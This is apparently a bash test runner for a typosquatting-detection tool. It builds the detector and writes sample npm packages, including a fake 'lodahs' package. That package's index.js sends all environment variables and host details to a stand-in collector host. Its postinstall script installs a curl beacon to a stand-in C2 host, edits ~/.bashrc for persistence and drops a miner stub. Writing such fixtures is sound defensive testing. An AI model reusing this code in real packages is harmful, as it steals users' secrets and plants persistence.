#!/bin/bash

# Typosentinel Enhanced Detection Test Suite Runner
# This script runs comprehensive tests to validate 99% detection effectiveness

set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_FILE="${PROJECT_ROOT}/configs/enhanced.yaml"
TEST_PACKAGES_DIR="${PROJECT_ROOT}/test_packages"
RESULTS_DIR="${PROJECT_ROOT}/test_results"
LOG_FILE="${RESULTS_DIR}/test_execution.log"
TIMEOUT="30m"
VERBOSE=false

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -t|--timeout)
            TIMEOUT="$2"
            shift 2
            ;;
        -c|--config)
            CONFIG_FILE="$2"
            shift 2
            ;;
        -o|--output)
            RESULTS_DIR="$2"
            shift 2
            ;;
        -h|--help)
            echo "Usage: $0 [OPTIONS]"
            echo "Options:"
            echo "  -v, --verbose     Enable verbose output"
            echo "  -t, --timeout     Set test timeout (default: 30m)"
            echo "  -c, --config      Configuration file path"
            echo "  -o, --output      Output directory for results"
            echo "  -h, --help        Show this help message"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Logging function
log() {
    local level=$1
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case $level in
        "INFO")
            echo -e "${BLUE}[INFO]${NC} $message"
            ;;
        "WARN")
            echo -e "${YELLOW}[WARN]${NC} $message"
            ;;
        "ERROR")
            echo -e "${RED}[ERROR]${NC} $message"
            ;;
        "SUCCESS")
            echo -e "${GREEN}[SUCCESS]${NC} $message"
            ;;
    esac
    
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
}

# Check prerequisites
check_prerequisites() {
    log "INFO" "Checking prerequisites..."
    
    # Check if Go is installed
    if ! command -v go &> /dev/null; then
        log "ERROR" "Go is not installed or not in PATH"
        exit 1
    fi
    
    # Check Go version
    local go_version=$(go version | awk '{print $3}' | sed 's/go//')
    log "INFO" "Go version: $go_version"
    
    # Check if Python is available (for ML components)
    if ! command -v python3 &> /dev/null; then
        log "WARN" "Python3 not found - ML components may not work"
    fi
    
    # Check if required directories exist
    if [[ ! -d "$PROJECT_ROOT" ]]; then
        log "ERROR" "Project root directory not found: $PROJECT_ROOT"
        exit 1
    fi
    
    # Check if configuration file exists
    if [[ ! -f "$CONFIG_FILE" ]]; then
        log "ERROR" "Configuration file not found: $CONFIG_FILE"
        exit 1
    fi
    
    log "SUCCESS" "Prerequisites check completed"
}

# Setup test environment
setup_environment() {
    log "INFO" "Setting up test environment..."
    
    # Create necessary directories
    mkdir -p "$RESULTS_DIR"
    mkdir -p "$TEST_PACKAGES_DIR"
    mkdir -p "${PROJECT_ROOT}/logs"
    
    # Initialize log file
    echo "Typosentinel Enhanced Detection Test Suite" > "$LOG_FILE"
    echo "Started at: $(date)" >> "$LOG_FILE"
    echo "Configuration: $CONFIG_FILE" >> "$LOG_FILE"
    echo "========================================" >> "$LOG_FILE"
    
    log "SUCCESS" "Test environment setup completed"
}

# Build the project
build_project() {
    log "INFO" "Building Typosentinel project..."
    
    cd "$PROJECT_ROOT"
    
    # Clean previous builds
    if [[ -f "go.mod" ]]; then
        go clean -cache
        go mod tidy
        go mod download
    else
        log "WARN" "No go.mod found, initializing module..."
        go mod init github.com/typosentinel
        go mod tidy
    fi
    
    # Build the test runner
    log "INFO" "Building test runner..."
    go build -o "${RESULTS_DIR}/test_runner" "./cmd/test_runner"
    
    if [[ $? -eq 0 ]]; then
        log "SUCCESS" "Project build completed successfully"
    else
        log "ERROR" "Project build failed"
        exit 1
    fi
}

# Setup test packages
setup_test_packages() {
    log "INFO" "Setting up test packages..."
    
    # Create malicious test package (lodahs)
    local malicious_pkg="${TEST_PACKAGES_DIR}/lodahs"
    mkdir -p "$malicious_pkg"
    
    # Create package.json for malicious package
    cat > "${malicious_pkg}/package.json" << 'EOF'
{
  "name": "lodahs",
  "version": "1.0.0",
  "description": "A utility library (typosquatting lodash)",
  "main": "index.js",
  "scripts": {
    "postinstall": "node postinstall.js",
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": ["utility", "lodash", "helper"],
  "author": "malicious-actor",
  "license": "MIT",
  "dependencies": {
    "request": "^2.88.0"
  }
}
EOF
    
    # Create malicious index.js
    cat > "${malicious_pkg}/index.js" << 'EOF'
// Typosquatting lodash with malicious functionality
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');

// Legitimate-looking utility functions
function map(array, fn) {
    return array.map(fn);
}

function filter(array, fn) {
    return array.filter(fn);
}

// Malicious data collection
function collectSystemInfo() {
    try {
        const info = {
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            user: os.userInfo().username,
            env: process.env,
            cwd: process.cwd(),
            timestamp: new Date().toISOString()
        };
        
        // Attempt to exfiltrate data
        const data = Buffer.from(JSON.stringify(info)).toString('base64');
        
        // Hidden network call
        if (typeof require !== 'undefined') {
            try {
                const http = require('http');
                const postData = JSON.stringify({ data: data });
                
                const options = {
                    hostname: 'malicious-collector.example.com',
                    port: 80,
                    path: '/collect',
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Content-Length': Buffer.byteLength(postData)
                    }
                };
                
                const req = http.request(options);
                req.write(postData);
                req.end();
            } catch (e) {
                // Silently fail
            }
        }
    } catch (e) {
        // Silently fail
    }
}

// Execute malicious code on import
setTimeout(collectSystemInfo, 1000);

// Export legitimate-looking API
module.exports = {
    map,
    filter,
    // Hidden malicious export
    _internal: collectSystemInfo
};
EOF
    
    # Create malicious postinstall script
    cat > "${malicious_pkg}/postinstall.js" << 'EOF'
#!/usr/bin/env node

// Malicious postinstall script
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');

console.log('Setting up lodahs...');

try {
    // Create hidden directory
    const hiddenDir = path.join(os.homedir(), '.lodahs-cache');
    if (!fs.existsSync(hiddenDir)) {
        fs.mkdirSync(hiddenDir, { mode: 0o755 });
    }
    
    // Create persistence mechanism
    const persistScript = `
#!/bin/bash
# Auto-generated script
while true; do
    curl -s http://malicious-c2.example.com/beacon -d "id=$(hostname)" || true
    sleep 3600
done
`;
    
    const scriptPath = path.join(hiddenDir, 'update.sh');
    fs.writeFileSync(scriptPath, persistScript, { mode: 0o755 });
    
    // Attempt to modify system files (will fail in sandbox)
    try {
        const bashrc = path.join(os.homedir(), '.bashrc');
        if (fs.existsSync(bashrc)) {
            const maliciousLine = `\n# Auto-generated\nexport PATH="${hiddenDir}:$PATH"\n`;
            fs.appendFileSync(bashrc, maliciousLine);
        }
    } catch (e) {
        // Silently fail
    }
    
    // Cryptocurrency mining simulation
    const minerScript = `
const crypto = require('crypto');
setInterval(() => {
    // Simulate CPU-intensive mining
    for (let i = 0; i < 100000; i++) {
        crypto.createHash('sha256').update(Math.random().toString()).digest('hex');
    }
}, 1000);
`;
    
    fs.writeFileSync(path.join(hiddenDir, 'miner.js'), minerScript);
    
    console.log('lodahs setup completed successfully!');
} catch (error) {
    console.log('Setup completed with warnings.');
}
EOF
    
    # Create legitimate test package (lodash)
    local clean_pkg="${TEST_PACKAGES_DIR}/lodash"
    mkdir -p "$clean_pkg"
    
    cat > "${clean_pkg}/package.json" << 'EOF'
{
  "name": "lodash",
  "version": "4.17.21",
  "description": "Lodash modular utilities.",
  "main": "lodash.js",
  "keywords": ["modules", "stdlib", "util"],
  "author": "John-David Dalton",
  "license": "MIT",
  "repository": {
    "type": "git",
    "url": "git+https://github.com/lodash/lodash.git"
  }
}
EOF
    
    cat > "${clean_pkg}/index.js" << 'EOF'
// Legitimate lodash-like utility functions
function map(array, iteratee) {
    const result = [];
    for (let i = 0; i < array.length; i++) {
        result[i] = iteratee(array[i], i, array);
    }
    return result;
}

function filter(array, predicate) {
    const result = [];
    for (let i = 0; i < array.length; i++) {
        if (predicate(array[i], i, array)) {
            result.push(array[i]);
        }
    }
    return result;
}

function reduce(array, iteratee, accumulator) {
    let index = 0;
    if (accumulator === undefined) {
        accumulator = array[0];
        index = 1;
    }
    
    for (let i = index; i < array.length; i++) {
        accumulator = iteratee(accumulator, array[i], i, array);
    }
    
    return accumulator;
}

module.exports = {
    map,
    filter,
    reduce
};
EOF
    
    log "SUCCESS" "Test packages setup completed"
}

# Run the comprehensive test suite
run_tests() {
    log "INFO" "Starting comprehensive detection tests..."
    
    local test_runner="${RESULTS_DIR}/test_runner"
    
    if [[ ! -f "$test_runner" ]]; then
        log "ERROR" "Test runner not found: $test_runner"
        exit 1
    fi
    
    # Prepare test runner arguments
    local args=()
    args+=("--config" "$CONFIG_FILE")
    args+=("--output" "$RESULTS_DIR")
    args+=("--timeout" "$TIMEOUT")
    args+=("--format" "json")
    
    if [[ "$VERBOSE" == "true" ]]; then
        args+=("--verbose")
    fi
    
    log "INFO" "Running test suite with timeout: $TIMEOUT"
    log "INFO" "Command: $test_runner ${args[*]}"
    
    # Run the tests
    cd "$PROJECT_ROOT"
    "$test_runner" "${args[@]}" 2>&1 | tee -a "$LOG_FILE"
    
    local exit_code=${PIPESTATUS[0]}
    
    if [[ $exit_code -eq 0 ]]; then
        log "SUCCESS" "Test suite completed successfully - 99% effectiveness achieved!"
    else
        log "ERROR" "Test suite failed - effectiveness below 99% target"
        log "INFO" "Check the detailed report in $RESULTS_DIR for improvement recommendations"
    fi
    
    return $exit_code
}

# Generate summary report
generate_summary() {
    log "INFO" "Generating test summary..."
    
    local summary_file="${RESULTS_DIR}/test_summary.txt"
    
    cat > "$summary_file" << EOF
Typosentinel Enhanced Detection Test Suite Summary
================================================

Execution Details:
- Started: $(head -2 "$LOG_FILE" | tail -1 | cut -d' ' -f3-)
- Completed: $(date)
- Configuration: $CONFIG_FILE
- Results Directory: $RESULTS_DIR
- Timeout: $TIMEOUT

Test Results:
EOF
    
    # Check if effectiveness report exists
    local effectiveness_report="${RESULTS_DIR}/effectiveness_report.md"
    if [[ -f "$effectiveness_report" ]]; then
        echo "- Detailed effectiveness report: $effectiveness_report" >> "$summary_file"
        
        # Extract key metrics from the report
        if grep -q "Effectiveness Score" "$effectiveness_report"; then
            local effectiveness=$(grep "Effectiveness Score" "$effectiveness_report" | head -1 | sed 's/.*: //')
            echo "- Overall Effectiveness: $effectiveness" >> "$summary_file"
        fi
        
        if grep -q "Overall Grade" "$effectiveness_report"; then
            local grade=$(grep "Overall Grade" "$effectiveness_report" | head -1 | sed 's/.*: //')
            echo "- Grade: $grade" >> "$summary_file"
        fi
    fi
    
    # Check for JSON results
    local json_results=$(find "$RESULTS_DIR" -name "test_results_*.json" -type f | head -1)
    if [[ -f "$json_results" ]]; then
        echo "- Detailed JSON results: $json_results" >> "$summary_file"
    fi
    
    echo "" >> "$summary_file"
    echo "Log File: $LOG_FILE" >> "$summary_file"
    
    log "SUCCESS" "Summary report generated: $summary_file"
}

# Cleanup function
cleanup() {
    log "INFO" "Cleaning up temporary files..."
    
    # Remove any temporary test artifacts
    find "$TEST_PACKAGES_DIR" -name "*.tmp" -delete 2>/dev/null || true
    find "$RESULTS_DIR" -name "*.tmp" -delete 2>/dev/null || true
    
    log "SUCCESS" "Cleanup completed"
}

# Main execution
main() {
    echo -e "${BLUE}🔍 Typosentinel Enhanced Detection Test Suite${NC}"
    echo -e "${BLUE}=============================================${NC}"
    echo ""
    
    # Setup signal handlers
    trap cleanup EXIT
    trap 'log "ERROR" "Test suite interrupted"; exit 130' INT TERM
    
    # Execute test pipeline
    check_prerequisites
    setup_environment
    build_project
    setup_test_packages
    
    local start_time=$(date +%s)
    
    if run_tests; then
        local end_time=$(date +%s)
        local duration=$((end_time - start_time))
        
        log "SUCCESS" "All tests completed successfully in ${duration}s"
        log "SUCCESS" "Detection effectiveness target of 99% achieved!"
        
        generate_summary
        
        echo ""
        echo -e "${GREEN}🎉 SUCCESS: Typosentinel detection system is ready for production!${NC}"
        echo -e "${GREEN}✅ 99% detection effectiveness target achieved${NC}"
        echo -e "${BLUE}📊 Detailed reports available in: $RESULTS_DIR${NC}"
        
        exit 0
    else
        local end_time=$(date +%s)
        local duration=$((end_time - start_time))
        
        log "ERROR" "Tests failed after ${duration}s"
        
        generate_summary
        
        echo ""
        echo -e "${RED}❌ FAILURE: Detection effectiveness below 99% target${NC}"
        echo -e "${YELLOW}⚠️  Review the detailed report for improvement recommendations${NC}"
        echo -e "${BLUE}📊 Detailed reports available in: $RESULTS_DIR${NC}"
        
        exit 1
    fi
}

# Run main function
main "$@"